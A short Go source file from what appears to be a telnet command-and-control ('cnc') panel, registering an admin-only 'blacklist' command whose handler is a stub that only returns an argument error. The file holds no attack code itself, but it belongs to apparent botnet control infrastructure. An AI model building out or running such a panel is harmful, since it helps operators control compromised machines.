package admin

import (
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"blacklist"},
		Description: "Manages the blacklist",
		Admin:       true,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			return command.ErrNotEnoughArguments
		},
	})
}
